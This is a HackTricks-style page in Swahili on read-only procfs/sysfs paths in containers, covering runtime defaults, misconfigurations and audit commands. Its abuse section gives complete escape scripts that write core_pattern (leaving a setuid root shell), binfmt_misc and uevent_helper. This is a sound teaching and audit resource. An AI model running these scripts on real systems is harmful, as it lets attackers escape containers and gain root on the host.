# Njia za Mfumo Zilizosomwa Pekee

{{#include ../../../../banners/hacktricks-training.md}}

Njia za mfumo zilizosomwa pekee ni ulinzi tofauti na masked paths. Badala ya kuficha njia kabisa, runtime inaiweka wazi lakini kuiweka mounted kama read-only. Hii ni ya kawaida kwa maeneo maalum ya procfs na sysfs ambapo kusoma kunaweza kukubalika au kuhitajika kiafisa, lakini kuandika kutakuwa hatari sana.

Madhumuni ni rahisi: interfaces nyingi za kernel zinakuwa hatari zaidi zinapoweza kuandikwa. Mount iliyo read-only haiondoi thamani yote ya upelelezi, lakini inazuia workload iliyodhuriwa kuharibu au kubadilisha faili zinazomkabili kernel kupitia njia hiyo.

## Uendeshaji

Runtimes mara nyingi huweka sehemu za mtazamo wa proc/sys kuwa read-only. Kutegemea runtime na host, hii inaweza kujumuisha njia kama:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Orodha halisi inatofautiana, lakini mtazamo ni ule ule: ruhusu kuonekana pale inapohitajika, kata ruhusa ya mabadiliko kwa chaguo-msingi.

## Maabara

Kagua orodha ya njia zilizotangazwa kuwa zilizosomwa pekee na Docker:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Chunguza mtazamo wa proc/sys uliowekwa kutoka ndani ya container:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Security Impact

Read-only system paths hupunguza aina kubwa ya matumizi mabaya yanayoathiri host. Hata wakati mshambuliaji anaweza kukagua procfs au sysfs, kutokuwa na uwezo wa kuandika huko kunafuta njia nyingi za moja kwa moja za urekebishaji zinazohusisha kernel tunables, crash handlers, module-loading helpers, au interface nyingine za udhibiti. Ufunuo haujaondoka kabisa, lakini mabadiliko kutoka disclosure ya taarifa hadi kuathiri host yanakuwa magumu zaidi.

## Misconfigurations

Makosa makuu ni ku-unmask au ku-remount njia nyeti kuwa read-write, kufichua maudhui ya host proc/sys moja kwa moja kwa writable bind mounts, au kutumia privileged modes ambazo kwa ufanisi zinapitisha mipangilio salama ya runtime. Katika Kubernetes, `procMount: Unmasked` na privileged workloads mara nyingi huenda sambamba na ulinzi dhaifu wa proc. Kosa lingine la kawaida la ki-operesheni ni kudhani kwamba kwa sababu runtime kawaida hu-mount njia hizi kuwa read-only, workloads zote bado zinaendelea kurithi default hiyo.

## Abuse

Ikiwa ulinzi ni dhaifu, anza kwa kutafuta proc/sys entries zinazoweza kuandikwa:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Wakati vipengele vinavyoweza kuandikwa vipo, njia za kufuatilia zenye thamani kubwa ni:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Nini amri hizi zinaweza kufichua:

- Ingizo zinazoweza kuandikwa chini ya `/proc/sys` mara nyingi zina maana container inaweza kubadilisha tabia ya host kernel badala ya kuichunguza tu.
- `core_pattern` ni hasa muhimu kwa sababu thaman i inayoweza kuandikwa na kuonekana kwa host inaweza kubadilishwa kuwa njia ya utekelezaji wa code kwenye host kwa kuharibu process baada ya kuweka pipe handler.
- `modprobe` inaonyesha helper inayotumiwa na kernel kwa ajili ya module-loading related flows; ni lengo la thamani kubwa pale linapoweza kuandikwa.
- `binfmt_misc` inaeleza kama registration ya interpreter maalum inawezekana. Ikiwa registration inaweza kuandikwa, hii inaweza kuwa execution primitive badala ya information leak tu.
- `panic_on_oom` inadhibiti uamuzi wa kernel unaoathiri host nzima na kwa hivyo inaweza kubadilisha kukatika kwa rasilimali kuwa host denial of service.
- `uevent_helper` ni mojawapo ya mifano wazi kabisa ya sysfs helper path inayoweza kuandikwa ambayo inasababisha utekelezaji katika muktadha wa host.

Matokeo ya kuvutia ni pamoja na knobs za proc zinazoonekana kwa host au ingizo za sysfs zinazoweza kuandikwa ambazo kwa kawaida zilipaswa kuwa read-only. Katika hatua hiyo, workload imehamia kutoka mtazamo uliowekwa wa container kuelekea ushawishi wa maana kwenye kernel.

### Mfano Kamili: `core_pattern` Host Escape

Ikiwa `/proc/sys/kernel/core_pattern` inaweza kuandikwa kutoka ndani ya container na inaonyesha mtazamo wa host kernel, inaweza kutumiwa vibaya kutekeleza payload baada ya crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Ikiwa njia hiyo kwa kweli inafikia kernel ya host, payload inatekelezwa kwenye host na inaacha shell ya setuid nyuma.

### Mfano Kamili: Usajili wa `binfmt_misc`

Ikiwa `/proc/sys/fs/binfmt_misc/register` inaweza kuandikwa, usajili wa interpreter maalum unaweza kusababisha utekelezaji wa code wakati faili inayolingana inapoendeshwa:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Katika `binfmt_misc` inayoweza kuandikwa na inayofikika kutoka kwa host, matokeo yake ni utekelezaji wa msimbo katika njia ya interpreter inayochochewa na kernel.

### Mfano Kamili: `uevent_helper`

Ikiwa `/sys/kernel/uevent_helper` inaweza kuandikwa, kernel inaweza kuitisha host-path helper wakati tukio linalolingana linapochochewa:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Sababu inayoifanya hii kuwa hatari sana ni kwamba helper path inatatuliwa kutoka mtazamo wa mfumo wa faili wa mwenyeji badala ya kutoka muktadha salama wa container pekee.

## Ukaguzi

Ukaguzi huu unabaini kama ufichaji wa procfs/sysfs umewekwa kuwa wa kusoma-tu (read-only) pale panapotarajiwa, na kama workload bado inaweza kubadilisha interfaces nyeti za kernel.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Kinachovutia hapa:

- Workload iliyothibishwa kawaida inapaswa kufichua wenige tu wa vipengele vya /proc/sys vinavyoweza kuandikwa.
- Njia za `/proc/sys` zinazoweza kuandikwa mara nyingi ni muhimu zaidi kuliko ufikaji wa kawaida wa kusoma.
- Ikiwa runtime inasema njia ni read-only lakini inakuwa inaweza kuandikwa kwa vitendo, pitia mount propagation, bind mounts, na mipangilio ya ruhusa kwa uangalifu.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Imewezeshwa kwa chaguo-msingi | Docker hutoa orodha ya chaguo-msingi ya njia za kusoma tu kwa vipengele nyeti vya /proc | exposing host proc/sys mounts, `--privileged` |
| Podman | Imewezeshwa kwa chaguo-msingi | Podman inatumia njia za kusoma tu kwa chaguo-msingi isipokuwa zikifunguliwa wazi | `--security-opt unmask=ALL`, broad host mounts, `--privileged` |
| Kubernetes | Inarithi runtime defaults | Inatumia modeli ya njia za kusoma tu ya runtime msingi isipokuwa ikidhoofishwa na mipangilio ya Pod au host mounts | `procMount: Unmasked`, privileged workloads, writable host proc/sys mounts |
| containerd / CRI-O under Kubernetes | Runtime default | Kwa kawaida hutegemea default za OCI/runtime | same as Kubernetes row; direct runtime config changes can weaken the behavior |

Jambo la msingi ni kwamba njia za mfumo za kusoma tu kwa kawaida zipo kama chaguo-msingi la runtime, lakini ni rahisi kuzidhoofisha kwa modes za privileged au host bind mounts.
{{#include ../../../../banners/hacktricks-training.md}}
